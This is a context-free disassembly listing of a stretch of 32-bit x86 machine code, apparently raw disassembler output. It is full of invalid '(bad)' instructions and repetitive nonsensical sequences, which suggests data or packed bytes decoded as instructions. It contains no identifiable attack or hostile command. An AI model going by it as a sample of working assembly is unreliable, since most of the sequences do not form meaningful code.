  444679:	call   0xe94235df
  44467e:	popa   
  44467f:	sti    
  444680:	std    
  444681:	call   0xe9423de7
  444686:	popa   
  444687:	add    edi,esi
  444689:	call   0xe94245ef
  44468e:	popa   
  44468f:	or     edi,esi
  444691:	call   0xe9424df7
  444696:	popa   
  444697:	push   eax
  444698:	cld    
  444699:	call   0xe940a2ff
  44469e:	popa   
  44469f:	pop    eax
  4446a0:	cld    
  4446a1:	call   0xe9425e07
  4446a6:	add    BYTE PTR [ecx+0x23],ah
  4446a9:	(bad)  
  4446aa:	call   0xe9426610
  4446af:	popa   
  4446b0:	sub    edi,esi
  4446b2:	call   0xe9426e18
  4446b7:	popa   
  4446b8:	xor    edi,esi
  4446ba:	call   0xe9427620
  4446bf:	popa   
  4446c0:	cmp    edi,esi
  4446c2:	call   0xe9427e28
  4446c7:	popa   
  4446c8:	inc    ebx
  4446c9:	(bad)  
  4446ca:	call   0xe9428630
  4446cf:	popa   
  4446d0:	dec    ebx
  4446d1:	(bad)  
  4446d2:	call   0xe9428e38
  4446d7:	popa   
  4446d8:	push   ebx
  4446d9:	(bad)  
  4446da:	call   0xe9429640
  4446df:	popa   
  4446e0:	pop    ebx
  4446e1:	(bad)  
  4446e2:	dec    DWORD PTR [ebx-0x74f97d29]
  4446e8:	xlat   BYTE PTR ds:[ebx]
  4446e9:	outs   dx,BYTE PTR ds:[esi]
  4446ea:	push   es
  4446eb:	jnp    0x4446c4
  4446ed:	jp     0x4446f5
  4446ef:	jnp    0x4446c8
  4446f1:	pushw  es
  4446f3:	dec    ebx
  4446f4:	xlat   BYTE PTR ds:[ebx]
  4446f5:	jb     0x4446fd
  4446f7:	dec    ebx
  4446f8:	xlat   BYTE PTR ds:[ebx]
  4446f9:	pop    esi
  4446fa:	push   es
  4446fb:	cmp    edx,edi
  4446fd:	push   0x6
  4446ff:	cmp    edx,edi
  444701:	push   esi
  444702:	push   es
  444703:	dec    ebx
  444704:	xlat   BYTE PTR ds:[ebx]
  444705:	bound  eax,QWORD PTR [esi]
  444707:	dec    ebx
  444708:	xlat   BYTE PTR ds:[ebx]
  444709:	dec    esi
  44470a:	push   es
  44470b:	add    BYTE PTR [ebx],bh
  44470d:	xlat   BYTE PTR ds:[ebx]
  44470e:	pop    edx
  44470f:	push   es
  444710:	cmp    edx,edi
  444712:	inc    esi
  444713:	push   es
  444714:	or     edx,edi
  444716:	push   edx
  444717:	push   es
  444718:	or     edx,edi
  44471a:	or     eax,DWORD PTR [ebx+edi*8]
  44471d:	(bad)  
  44471e:	test   DWORD PTR [ebx],0x403d6fb
  444724:	or     edx,edi
  444726:	out    dx,eax
  444727:	add    ecx,DWORD PTR [ebx]
  444729:	xlat   BYTE PTR ds:[ebx]
  44472a:	cs push es
  44472c:	sti    
  44472d:	(bad)  
  44472e:	cmp    al,BYTE PTR [esi]
  444730:	sti    
  444731:	(bad)  
  444732:	es push es
  444734:	retf   
  444735:	(bad)  
  444736:	xor    al,BYTE PTR [esi]
  444738:	retf   
  444739:	(bad)  
  44473a:	push   ds
  44473b:	push   es
  44473c:	mov    ebx,0xbb062ad6
  444741:	(bad)  
  444742:	push   ss
  444743:	push   es
  444744:	retf   
  444745:	(bad)  
  444746:	and    al,BYTE PTR [esi]
  444748:	retf   
  444749:	(bad)  
  44474a:	push   cs
  44474b:	push   es
  44474c:	mov    ebx,0xbb061ad6
  444751:	(bad)  
  444752:	push   es
  444753:	push   es
  444754:	mov    edx,esi
  444756:	adc    al,BYTE PTR [esi]
  444758:	mov    edx,esi
  44475a:	inc    BYTE PTR ds:0xa02f062
  444760:	pop    esp
  444761:	lock add bh,dh
  444764:	lock add al,BYTE PTR [bp+si]
  444768:	pop    esp
  444769:	lock add dh,dh
  44476c:	addr16 lock add bh,dl
  444770:	add    BYTE PTR [edi-0x10],bl
  444773:	add    ch,dh
  444775:	addr16 lock add dh,dl
  444779:	pop    edi
  44477a:	lock add ah,dh
  44477d:	addr16 lock add ch,dl
  444781:	pop    edi
  444782:	lock add bl,dh
  444785:	addr16 lock add ah,dl
  444789:	pop    edi
  44478a:	lock add dl,dh
  44478d:	addr16 lock add bl,dl
  444791:	pop    edi
  444792:	lock add cl,dh
  444795:	addr16 lock add dl,dl
  444799:	pop    edi
  44479a:	lock add al,dh
  44479d:	addr16 lock add cl,dl
  4447a1:	pop    edi
  4447a2:	lock add bh,BYTE PTR [esi-0x3dfd0f99]
  4447a9:	pop    edi
  4447aa:	lock add dh,BYTE PTR [esi-0x45fd0f99]
  4447b1:	pop    edi
  4447b2:	lock add ch,BYTE PTR [esi-0x4dfd0f99]
  4447b9:	pop    edi
  4447ba:	lock add ah,BYTE PTR [esi-0x55fd0f99]
  4447c1:	pop    edi
  4447c2:	lock add bl,BYTE PTR [esi-0x5dfd0f99]
  4447c9:	pop    edi
  4447ca:	lock add dl,BYTE PTR [esi-0x65fd0f99]
  4447d1:	pop    edi
  4447d2:	lock add cl,BYTE PTR [esi-0x16269900]
  4447d9:	add    esi,eax
  4447db:	shr    ecx,cl
  4447dd:	add    esp,esp
  4447df:	shr    ecx,cl
  4447e1:	add    ebx,eax
  4447e3:	shr    ecx,cl
  4447e5:	add    edi,esp
  4447e7:	shr    ecx,cl
  4447e9:	add    esp,eax
  4447eb:	shr    ecx,cl
  4447ed:	add    esi,esp
  4447ef:	shr    ecx,cl
  4447f1:	add    ebp,eax
  4447f3:	shr    ecx,cl
  4447f5:	add    ecx,esp
  4447f7:	fsubrp st(7),st
  4447f9:	add    edx,eax
  4447fb:	fsubrp st(7),st
  4447fd:	add    eax,esp
  4447ff:	fsubrp st(7),st
  444801:	add    edi,DWORD PTR [eax-0x63fc1822]
  444807:	fsubrp st(7),st
  444809:	add    eax,eax
  44480b:	fsubrp st(7),st
  44480d:	add    edx,DWORD PTR [esi+ebx*8-0x2177fc19]
  444814:	out    0x3,eax
  444816:	lods   al,BYTE PTR ds:[esi]
  444817:	fsubrp st(7),st
  444819:	add    esi,DWORD PTR [eax-0x5bfc1822]
  44481f:	fsubrp st(7),st
  444821:	add    ebx,DWORD PTR [eax+0x3c03e7de]
  444827:	fsubrp st(7),st
  444829:	add    esp,DWORD PTR [eax+0x3403e7de]
  44482f:	fsubrp st(7),st
  444831:	add    ebp,DWORD PTR [eax]
  444833:	fsubrp st(7),st
  444835:	add    ecx,DWORD PTR [esi+ebx*8-0x6ffffc19]
  44483c:	fsubrp st(7),st
  44483e:	add    eax,DWORD PTR [esi+ebx*8-0x2187fc19]
  444845:	out    0x3,eax
  444847:	pop    esp
  444848:	fsubrp st(7),st
  44484a:	add    eax,DWORD PTR [eax+0x5403e7de]
  444850:	fiadd  WORD PTR [eax]
  444852:	jmp    0xe9403bb8
  444857:	popa   
  444858:	out    0xfb,eax
  44485a:	call   0xe94033c0
  44485f:	popa   
  444860:	(bad)  
  444862:	call   0xe9402bc8
  444867:	popa   
  444868:	xlat   BYTE PTR ds:[ebx]
  444869:	std    
  44486a:	call   0xe94023d0
  44486f:	popa   
  444870:	iret   
  444871:	std    
  444872:	call   0xe9421bd8
  444877:	popa   
  444878:	(bad)  
  444879:	std    
  44487a:	call   0xe94213e0
  44487f:	popa   
  444880:	mov    edi,0xc361e8fd
  444885:	std    
  444886:	call   0xe941ffec
  44488b:	popa   
  44488c:	mov    ebx,0xaf61e8fd
  444891:	std    
  444892:	call   0xe941fbf8
  444897:	popa   
  444898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444899:	std    
  44489a:	call   0xe941f400
  44489f:	add    BYTE PTR [ecx-0x61],ah
  4448a2:	std    
  4448a3:	call   0xe941ec09
  4448a8:	popa   
  4448a9:	xchg   edi,eax
  4448aa:	std    
  4448ab:	call   0xe941e411
  4448b0:	popa   
  4448b1:	(bad)  
  4448b2:	std    
  4448b3:	call   0xe941dc19
  4448b8:	popa   
  4448b9:	xchg   ebp,edi
  4448bb:	call   0xe941d421
  4448c0:	popa   
  4448c1:	jg     0x4448c0
  4448c3:	call   0xe941cc29
  4448c8:	popa   
  4448c9:	ja     0x4448c8
  4448cb:	dec    ebx
  4448cd:	(bad)  [edx-0x712444fc]
  4448d3:	add    al,0xbb
  4448d5:	fistp  DWORD PTR [edx-0x792474fc]
  4448db:	add    al,0x8b
  4448dd:	fist   DWORD PTR [edx+0x7edb7b04]
  4448e3:	add    al,0x7b
  4448e5:	fisttp DWORD PTR [edx+0x76db8b04]
  4448eb:	add    al,0x8b
  4448ed:	fild   DWORD PTR [edx+0x6edb7b04]
  4448f3:	add    al,0x7b
  4448f5:	fstp   TBYTE PTR [edx+0x4]
  4448f8:	dec    ebx
  4448f9:	(bad)  [esi+0x4]
  4448fc:	dec    ebx
  4448fd:	(bad)  [edx+0x4]
  444900:	cmp    ebx,ebx
  444902:	pop    esi
  444903:	add    al,0x0
  444905:	cmp    ebx,ebx
  444907:	push   0x4
  444909:	dec    ebx
  44490a:	fist   DWORD PTR [esi+0x4]
  44490d:	dec    ebx
  44490e:	(bad)  [edx+0x4]
  444911:	cmp    ebx,ebx
  444913:	dec    esi
  444914:	add    al,0x3b
  444916:	fistp  DWORD PTR [edx+0x4]
  444919:	or     ebx,ebx
  44491b:	inc    esi
  44491c:	add    al,0xb
  44491e:	fist   DWORD PTR [edx+0x4]
  444921:	sti    
  444922:	fidivr DWORD PTR [esi]
  444924:	add    al,0xfb
  444926:	fimul  DWORD PTR [edx+0x4]
  444929:	or     ebx,ebx
  44492b:	ss add al,0xb
  44492e:	fild   DWORD PTR [edx+0x4]
  444931:	sti    
  444932:	fisubr DWORD PTR [esi]
  444934:	add    al,0xfb
  444936:	fidivr DWORD PTR [edx]
  444938:	add    al,0xcb
  44493a:	fisub  DWORD PTR [esi]
  44493c:	add    al,0xcb
  44493e:	fidiv  DWORD PTR [edx]
  444940:	add    al,0xbb
  444942:	ficomp DWORD PTR [esi]
  444944:	add    al,0x62
  444946:	rol    BYTE PTR [edx],0x2a
  444949:	data16 rol BYTE PTR [edx],0x1e
  44494d:	pop    esi
  44494e:	rol    BYTE PTR [edx],0x22
  444951:	data16 rol BYTE PTR [edx],0x16
  444955:	pop    esi
  444956:	rol    BYTE PTR [edx],0x1a
  444959:	data16 rol BYTE PTR [edx],0xe
  44495d:	pop    esi
  44495e:	rol    BYTE PTR [edx],0x12
  444961:	data16 rol BYTE PTR [edx],0x6
  444965:	pop    esi
  444966:	rol    BYTE PTR [edx],0xa
  444969:	add    BYTE PTR [esi-0x40],ah
  44496c:	add    bh,dh
  44496e:	popa   
  44496f:	rol    BYTE PTR [edx],0x2
  444972:	data16 rol BYTE PTR [edx],0xf6
  444976:	popa   
  444977:	rol    BYTE PTR [edx],0xfa
  44497a:	popa   
  44497b:	rol    BYTE PTR [edx],0xee
  44497e:	popa   
  44497f:	rol    BYTE PTR [edx],0xf2
  444982:	popa   
  444983:	rol    BYTE PTR [edx],0xe6
  444986:	popa   
  444987:	rol    BYTE PTR [edx],0xea
  44498a:	popa   
  44498b:	rol    BYTE PTR [edx],0xde
  44498e:	popa   
  44498f:	rol    BYTE PTR [edx],0xe2
  444992:	popa   
  444993:	rol    BYTE PTR [edx],0xd6
  444996:	popa   
  444997:	rol    BYTE PTR [edx],0xda
  44499a:	popa   
  44499b:	rol    BYTE PTR [edx],0xce
  44499e:	popa   
  44499f:	rol    BYTE PTR [edx],0xd2
  4449a2:	popa   
  4449a3:	rol    BYTE PTR [edx],0x21
  4449a6:	arpl   ax,ax
  4449a8:	add    dl,BYTE PTR ds:0x1902c063
  4449ae:	arpl   ax,ax
  4449b0:	add    cl,BYTE PTR ds:0x1202c063
  4449b6:	arpl   ax,ax
  4449b8:	add    ch,BYTE PTR [esi]
  4449ba:	arpl   ax,ax
  4449bc:	add    dh,BYTE PTR ds:0x3e7d963
  4449c2:	iret   
  4449c3:	fsub   st,st(7)
  4449c5:	add    esp,DWORD PTR [ebx-0x28]
  4449c8:	out    0x3,eax
  4449ca:	mov    bh,0xd8
  4449cc:	out    0x3,eax
  4449ce:	add    BYTE PTR [ebx-0x40fc1828],bh
  4449d4:	fsub   st,st(7)
  4449d6:	add    esi,DWORD PTR [eax-0x78fc1828]
  4449dc:	fsub   st,st(7)
  4449de:	add    ecx,DWORD PTR [ebx-0x50fc1828]
  4449e4:	fsub   st,st(7)
  4449e6:	add    eax,DWORD PTR [ebx-0x68fc1828]
  4449ec:	fsub   st,st(7)
  4449ee:	add    ebx,DWORD PTR [ebx-0x60fc1828]
  4449f4:	fsub   st,st(7)
  4449f6:	add    edx,DWORD PTR [eax+0x2703e7d8]
  4449fc:	(bad)  
  4449fe:	add    ebp,DWORD PTR [ebx]
  444a00:	(bad)  
  444a02:	add    ecx,DWORD PTR [edi]
  444a04:	(bad)  
  444a06:	add    esp,DWORD PTR [ebx]
  444a08:	(bad)  
  444a0a:	add    esi,edi
  444a0c:	(bad)  
  444a0e:	add    edi,ebx
  444a10:	(bad)  
  444a12:	add    edi,edi
  444a14:	(bad)  
  444a16:	add    esi,ebx
  444a18:	(bad)  
  444a1a:	add    eax,edi
  444a1c:	(bad)  
  444a1e:	add    ecx,ebx
  444a20:	(bad)  
  444a22:	add    ebp,edi
  444a24:	(bad)  
  444a26:	add    ebp,DWORD PTR [esp+edx*8+0x1ee4ef55]
  444a2d:	or     eax,esi
  444a2f:	aaa    
  444a30:	mul    edi
  444a32:	mov    BYTE PTR [eax],0x2f
  444a35:	xlat   BYTE PTR ds:[ebx]
  444a36:	pop    es
  444a37:	add    al,0x62
  444a39:	fld    DWORD PTR [eax]
  444a3b:	scas   al,BYTE PTR es:[edi]
  444a3c:	sub    dl,bl
  444a3e:	push   ss
  444a3f:	jmp    0x24c623a5
  444a44:	rcl    DWORD PTR [esp+ebp*2],1
  444a47:	out    0x9c,al
  444a49:	push   ss
  444a4a:	jmp    FWORD PTR [eax]
  444a4c:	data16 fld DWORD PTR [eax]
  444a4f:	bound  ebp,QWORD PTR [edx]
  444a51:	clc    
  444a52:	add    eax,0xfd5e593f
  444a57:	outs   dx,BYTE PTR ds:[esi]
  444a58:	pusha  
  444a59:	fld    DWORD PTR [ecx-0x2e339a57]
  444a5f:	push   0xffffffd9
  444a61:	int3   
  444a62:	ins    DWORD PTR es:[edi],dx
  444a63:	out    dx,eax
  444a64:	fcom   DWORD PTR [esi]
  444a66:	and    dl,BYTE PTR [edx]
  444a68:	sbb    edi,esp
  444a6a:	push   esi
  444a6b:	mov    bl,0x1e
  444a6d:	pop    eax
  444a6e:	mov    ebp,0x9970306
  444a73:	jmp    0xe95f611c
  444a78:	popa   
  444a79:	fld    DWORD PTR [eax]
  444a7b:	bound  ebp,QWORD PTR [edx-0x5e88fa08]
  444a81:	ficomp DWORD PTR [ebx]
  444a83:	cs popa 
  444a85:	fld    DWORD PTR [eax]
  444a87:	pusha  
  444a88:	mov    eax,ds:0x36e900d9
  444a8d:	stos   BYTE PTR es:[edi],al
  444a8e:	out    dx,al
  444a8f:	sbb    dh,ah
  444a91:	adc    eax,0xd9e96a0b
  444a96:	imul   esp,ebp,0x0
  444a99:	loopne 0x444ab0
  444a9b:	sbb    ebp,eax
  444a9d:	loopne 0x444a6f
  444a9f:	add    esi,DWORD PTR [ebp+ebx*2+0x58]
  444aa3:	cmp    al,0x3
  444aa5:	pop    edx
  444aa6:	bound  ecx,QWORD PTR [edi+ebp*8+0x20]
  444aaa:	mov    ecx,0xd5b1e7fc
  444aaf:	idiv   cl
  444ab1:	popa   
  444ab2:	fld    DWORD PTR [ebx+0x267ff00]
  444ab8:	add    BYTE PTR [eax-0x63],bh
  444abb:	cmc    
  444abc:	(bad)  
  444abd:	sti    
  444abe:	cdq    
  444abf:	mov    al,BYTE PTR [ebp+0x68]
  444ac2:	out    0xa6,al
  444ac4:	inc    eax
  444ac5:	mov    edx,0xfa38e158
  444aca:	test   BYTE PTR [edx],al
  444acc:	mov    DWORD PTR [esi+0x48c3c1eb],ecx
  444ad2:	adc    al,0xf7
  444ad4:	pop    ds
  444ad5:	addr16 mov eax,0xd6c14583
  444adb:	mov    DWORD PTR [ebp-0x58],eax
  444ade:	in     al,0xa6
  444ae0:	inc    eax
  444ae1:	mov    DWORD PTR [eax-0x1f],ebx
  444ae4:	pop    es
  444ae5:	adc    bl,BYTE PTR [ebx+edx*1]
  444ae8:	and    DWORD PTR [esi-0x7e8b0c17],0x58
  444aef:	ins    BYTE PTR es:[edi],dx
  444af0:	or     cl,BYTE PTR [ebx-0x417d0af6]
  444af6:	icebp  
  444af7:	hlt    
  444af8:	ret    0x13f8
  444afb:	neg    DWORD PTR [edi]
  444afd:	add    BYTE PTR [edi],dl
  444aff:	fild   DWORD PTR [ecx-0x3e24cebb]
  444b05:	add    DWORD PTR [esi],0xffffffdd
  444b08:	adc    BYTE PTR [ebp+0x3f],dh
  444b0b:	pop    edx
  444b0c:	xor    al,0x1a
  444b0e:	dec    ecx
  444b0f:	call   0x8bee:0x946462e9
  444b16:	(bad)  
  444b17:	lock inc DWORD PTR [eax+ebx*1+0x5a]
  444b1c:	xor    al,0x23
  444b1e:	or     DWORD PTR [edx-0x65d7ba12],ebx
  444b24:	add    BYTE PTR [ebp+0x58],0xd7
  444b28:	rol    DWORD PTR [ebx+0x7510d7a6],0x62
  444b2f:	ret    0xd4aa
  444b32:	cmc    
  444b33:	mov    ds:0x4fac3b5,eax
  444b38:	add    eax,DWORD PTR [eax]
  444b3a:	bound  edi,QWORD PTR [edi-0x7f]
  444b3d:	jne    0x444b9f
  444b3f:	mov    al,0x2f
  444b41:	or     edx,ecx
  444b43:	jbe    0x444afa
  444b45:	test   ebp,0xa1233f7b
  444b4b:	push   0xc06201e5
  444b50:	rol    DWORD PTR [ebx+0x6d42af37],0x64
  444b57:	push   0xc06201e1
  444b5c:	shl    edi,0x27
  444b5f:	lahf   
  444b60:	rol    DWORD PTR [ebx-0x1d41e900],0x73
  444b67:	addr16 aas 
  444b69:	aas    
  444b6a:	and    ebx,DWORD PTR [edi-0x1]
  444b6d:	cmp    BYTE PTR ds:0x83c1bf41,0xf7
  444b74:	mov    ebp,0x3f676d42
  444b79:	aas    
  444b7a:	and    ebx,DWORD PTR [ebx-0x1]
  444b7d:	xor    BYTE PTR [ebp+0x60],0xe0
  444b81:	sub    eax,0xe17ce0fd
  444b86:	cld    
  444b87:	and    BYTE PTR [edi],bh
  444b89:	aas    
  444b8a:	and    esp,DWORD PTR [ecx-0x1]
  444b8d:	test   eax,0xb4eb3d80
  444b92:	neg    DWORD PTR [edi-0x507c3e61]
  444b98:	pop    DWORD PTR [edx+0x6d]
  444b9b:	cmp    bl,0x3e
  444b9e:	add    ah,BYTE PTR [edx+0x150002c0]
  444ba4:	jge    0x444b87
  444ba6:	mov    ah,BYTE PTR [edi-0x4bf4f527]
  444bac:	loopne 0x444c12
  444bae:	add    ah,ah
  444bb0:	aad    0xe7
  444bb2:	xchg   BYTE PTR [edx],ah
  444bb4:	ffree  st(6)
  444bb6:	aam    0xad
  444bb8:	sbb    ebp,edx
  444bba:	jecxz  0x444ba1
  444bbc:	shr    eax,1
  444bbe:	(bad)  
  444bbf:	aad    0x1b
  444bc1:	or     eax,edi
  444bc3:	loope  0x444c18
  444bc5:	sti    
  444bc6:	inc    ebx
  444bc7:	add    BYTE PTR [edi],bh
  444bc9:	neg    BYTE PTR [esi+0x1dd38141]
  444bcf:	out    0x3d,al
  444bd1:	push   esp
  444bd2:	retf   0x470a
  444bd5:	fstp   TBYTE PTR [edi+0x63]
  444bd8:	arpl   cx,bx
  444bda:	out    0xc6,eax
  444bdc:	fstp   DWORD PTR [ebx]
  444bde:	retf   
  444bdf:	or     cl,ah
  444be1:	loopne 0x444c3f
  444be3:	add    ah,bl
  444be5:	aad    0xe7
  444be7:	xchg   BYTE PTR [edx-0x5e2ba124],ah
  444bed:	push   ebp
  444bee:	popf   
  444bef:	out    0x62,al
  444bf1:	xchg   esi,eax
  444bf2:	dec    edi
  444bf3:	inc    ecx
  444bf4:	inc    ecx
  444bf5:	rcr    DWORD PTR [ebp+0xa53ede5],cl
  444bfb:	or     esi,edi
  444bfd:	fimul  DWORD PTR [edi+0x3b]
  444c00:	arpl   cx,bx
  444c02:	out    0xc6,eax
  444c04:	jmp    0xfc4f571f
  444c09:	loope  0x444c77
  444c0b:	add    ah,bl
  444c0d:	fsubr  st(7),st
  444c0f:	xchg   BYTE PTR [edx],ah
  444c11:	(bad)  
  444c12:	push   cs
  444c13:	aam    0x21
  444c15:	pop    ebp
  444c16:	test   DWORD PTR ds:0xabf24d82,eax
  444c1c:	ss shl bh,1
  444c1f:	mov    edx,0xca0116e1
  444c24:	adc    eax,0xc803e99c
  444c29:	enter  0x6af6,0x0
  444c2d:	mov    ds:0xe4aa02fc,al
  444c32:	inc    esi
  444c33:	xor    ch,BYTE PTR [ecx]
  444c35:	xor    ecx,edi
  444c37:	fisub  WORD PTR [ecx]
  444c39:	fld    DWORD PTR [bx+si]
  444c3c:	stos   BYTE PTR es:[edi],al
  444c3d:	fmul   QWORD PTR [esi]
  444c3f:	and    ch,bl
  444c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444c42:	pop    esp
  444c43:	cmp    al,0xa
  444c45:	bound  ebx,QWORD PTR [edx+eax*4-0x3c323adc]
  444c4c:	push   0xffffff8a
  444c4e:	or     al,0x41
  444c50:	adc    al,0x60
  444c52:	shl    DWORD PTR [eax+ebp*8],0x61
  444c56:	fld    st(1)
  444c58:	sub    DWORD PTR [esi],0x9c86f6c7
  444c5e:	rcr    DWORD PTR [ebx],0x7f
  444c61:	fmul   st,st(0)
  444c63:	xor    ah,0x67
  444c66:	fsubr  QWORD PTR [ebx-0x19]
  444c69:	mov    ecx,0xc866f781
  444c6e:	pushf  
  444c6f:	jmp    0x11db36d
  444c74:	sub    bl,ah
  444c76:	push   cs
  444c77:	and    ch,dl
  444c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444c7a:	pop    esp
  444c7b:	je     0x444c6c
  444c7d:	and    DWORD PTR [esi],edi
  444c7f:	cld    
  444c80:	imul   esp,DWORD PTR [edx-0x23d5f804],0x24e4220d
  444c8a:	pop    esp
  444c8b:	je     0x444c7c
  444c8d:	jno    0x444ccd
  444c8f:	cld    
  444c90:	imul   eax,DWORD PTR [eax],0x2a01fca2
  444c96:	fadd   QWORD PTR [ebp-0x1]
  444c99:	enter  0xce72,0x83
  444c9d:	add    dh,dh
  444c9f:	mov    dh,0xf5
  444ca1:	ret    0x1988
  444ca4:	and    cl,BYTE PTR [ecx]
  444ca6:	dec    eax
  444ca7:	pop    esp
  444ca8:	ins    BYTE PTR es:[edi],dx
  444ca9:	add    dl,bh
  444cab:	or     bh,dh
  444cad:	out    0x95,eax
  444caf:	xchg   ebx,eax
  444cb0:	out    dx,al
  444cb1:	dec    eax
  444cb3:	jl     0x444c74
  444cb5:	add    BYTE PTR [ebx],cl
  444cb7:	fadd   st(1),st
  444cb9:	sbb    BYTE PTR [esi-0xa8b002b],0x83
  444cc0:	inc    ebp
  444cc1:	(bad)  
  444cc2:	sbb    al,0x92
  444cc4:	ret    0x8e80
  444cc7:	fdiv   st(7),st
  444cc9:	je     0x444c90
  444ccb:	or     DWORD PTR [ecx-0x2],0xfffffffc
  444ccf:	xchg   ecx,eax
  444cd0:	ret    0x5e83
  444cd3:	xlat   BYTE PTR ds:[ebx]
  444cd4:	adc    BYTE PTR [ebp-0x3b],dh
  444cd7:	sub    DWORD PTR ds:0xc291dcfe,0xffffffe8
  444cde:	pop    ss
  444cdf:	aad    0x0
  444ce1:	add    al,cl
  444ce3:	push   ebp
  444ce4:	ins    BYTE PTR es:[edi],dx
  444ce5:	xor    ecx,DWORD PTR [ebx+0x0]
  444ce8:	mul    edi
  444cea:	xor    edx,ebp
  444cec:	add    BYTE PTR [eax],al
  444cee:	cmp    BYTE PTR [esi+0x6c],dl
  444cf1:	add    ch,BYTE PTR [ebx+0x0]
  444cf4:	hlt    
  444cf5:	add    BYTE PTR [eax],0xc6
  444cf8:	mov    ah,0xf7
  444cfa:	ret    0xff8
  444cfd:	and    al,BYTE PTR ds:0x7d829638
  444d03:	dec    ecx
  444d04:	jmp    0x444d6a
  444d06:	adc    BYTE PTR [ebx+0x7cffec09],ah
  444d0c:	pop    esp
  444d0d:	xor    al,0x1a
  444d0f:	cmp    dl,BYTE PTR [eax]
  444d11:	and    al,BYTE PTR [ebx-0x3d0b49fa]
  444d17:	(bad)  
  444d18:	fsub   DWORD PTR [eax]
  444d1a:	cmc    
  444d1b:	sub    eax,0x483d83e0
  444d20:	shl    DWORD PTR [edi],0x23
  444d23:	loope  0x444d9a
  444d25:	(bad)  
  444d27:	and    BYTE PTR [esi+ebp*1+0x33],al
  444d2b:	mov    ds:0xafe80045,al
  444d30:	rol    BYTE PTR [edx],0x0
  444d33:	and    DWORD PTR [edi+ebp*1+0x2],eax
  444d37:	inc    edx
  444d38:	sub    eax,0xe3a782f6
  444d3d:	inc    edx
  444d3f:	loope  0x444d3e
  444d41:	(bad)  
  444d43:	mov    al,ds:0xd5f583a8
  444d48:	xchg   DWORD PTR [ebp+0x75],edi
  444d4b:	je     0x444d0d
  444d4d:	daa    
  444d4e:	(bad)  
  444d4f:	mov    ebp,0xbdf7af7e
  444d54:	sub    DWORD PTR [edx+0x2c06226],0xffffffc3
  444d5b:	add    cl,ah
  444d5d:	fucomp st(3)
  444d5f:	aas    
  444d60:	das    
  444d61:	mov    ebp,0xb5413d7d
  444d66:	mov    ebp,0xe2c21783
  444d6b:	ins    BYTE PTR es:[edi],dx
  444d6c:	addr16 inc ebx
  444d6e:	aaa    
  444d6f:	and    ebx,DWORD PTR [edi+0x3]
  444d72:	jge    0x444db1
  444d74:	inc    ecx
  444d75:	ret    
  444d76:	mov    ebp,0x3bff780
  444d7b:	ins    DWORD PTR es:[edi],dx
  444d7c:	sbb    BYTE PTR fs:[ebx-0x42e89a0b],bl
  444d83:	call   0x470deb
  444d88:	and    DWORD PTR [eax-0x47],ecx
  444d8b:	test   DWORD PTR [ebp-0x1],0xd9c783bc
  444d92:	fiadd  DWORD PTR [ebx-0x31]
  444d95:	xlat   BYTE PTR ds:[ebx]
  444d96:	push   gs
  444d98:	sub    eax,0x3ac40fce
  444d9d:	push   edx
  444d9e:	add    eax,0xa55a2db8
  444da3:	in     al,0x62
  444da5:	call   0xd6b:0xf960366b
  444dac:	cli    
  444dad:	inc    ecx
  444dae:	in     eax,0xb7
  444db0:	or     eax,0xf9e3255a
  444db5:	call   0x83cf:0xcdef25d0
  444dbc:	das    
  444dbd:	cli    
  444dbe:	jmp    0x8f3e4e85
  444dc3:	mov    esp,0xeac0d5b7
  444dc8:	mov    eax,0x396bcdcd
  444dcd:	pop    esp
  444dce:	fldcw  WORD PTR [ebx+ecx*1]
  444dd1:	fst    DWORD PTR [ebx]
  444dd3:	add    al,BYTE PTR ds:0x416afa7f
  444dd9:	sbb    edx,0xe73783aa
  444ddf:	call   0x44f9f214
  444de4:	mov    bh,0x95
  444de6:	int    0xab
  444de8:	mov    edx,DWORD PTR [edi-0xd]
  444deb:	call   0x1d9e8f30
  444df0:	jecxz  0x444e55
  444df2:	call   0xf1d3:0xf960396b
  444df9:	jge    0x444e51
  444dfb:	dec    esp
  444dfc:	mov    bh,0x75
  444dfe:	shl    BYTE PTR [edx],0xb8
  444e01:	ins    DWORD PTR es:[edi],dx
  444e02:	int    0x6b
  444e04:	cmp    DWORD PTR [ecx+ebx*8-0x54],ebp
  444e08:	or     ch,cl
  444e0a:	push   ss
  444e0b:	add    ebx,edx
  444e0d:	pushw  cs
  444e0f:	and    ch,BYTE PTR [edx-0x5d]
  444e12:	clc    
  444e13:	(bad)  
  444e14:	sub    ecx,esp
  444e16:	inc    esi
  444e17:	psubsb mm6,QWORD PTR [edx-0x35]
  444e1b:	fiadd  WORD PTR [ebp+0x2af6c4f4]
  444e21:	(bad)  [esi]
  444e23:	sbb    ebp,eax
  444e25:	add    BYTE PTR [edx+0xa481f8],ah
  444e2b:	fcmovnb st,st(1)
  444e2d:	add    DWORD PTR [edx-0x4611093b],esi
  444e33:	jno    0x444e2a
  444e35:	out    0xb4,al
  444e37:	pop    eax
  444e38:	je     0x444e31
  444e3a:	popa   
  444e3b:	or     ah,BYTE PTR ds:[edx-0x5e]
  444e3f:	out    dx,eax
  444e40:	jmp    DWORD PTR [ebx]
  444e42:	add    DWORD PTR [eax+0x3c],ebx
  444e45:	or     ah,BYTE PTR [edx-0x68]
  444e48:	cmp    BYTE PTR [esp+eiz*2],0xda
  444e4c:	imul   ebp,edi,0xfffffff9
  444e4f:	psadbw mm5,QWORD PTR [esi+0x2c8a990c]
  444e56:	pop    eax
  444e57:	fidivr DWORD PTR [ebx]
  444e59:	retf   0xee0
  444e5c:	and    ch,bl
  444e5e:	mov    al,ds:0xec8d23c1
  444e63:	(bad)  
  444e64:	jmp    0xf7092878
  444e69:	push   0x5a
  444e6b:	(bad)  
  444e6d:	test   BYTE PTR [edi-0x3391e74c],0xc4
  444e74:	ret    0x2272
  444e77:	out    dx,eax
  444e78:	jmp    DWORD PTR [ebx+0xa3c5780]
  444e7e:	pusha  
  444e7f:	cwde   
  444e80:	jmp    0xf708fc28
  444e85:	add    al,cl
  444e87:	adc    DWORD PTR [edi],eax
  444e89:	push   es
  444e8a:	add    BYTE PTR ds:0x95fddece,dl
  444e90:	sub    esi,0xffffffc3
  444e93:	mov    ds:0x84fffa88,eax
  444e98:	pop    edi
  444e99:	xor    al,0x1a
  444e9b:	dec    edx
  444e9c:	sbb    DWORD PTR [edx],esp
  444e9e:	cmp    esi,0xffffffb6
  444ea1:	add    bl,al
  444ea3:	arpl   WORD PTR [eax-0x6],di
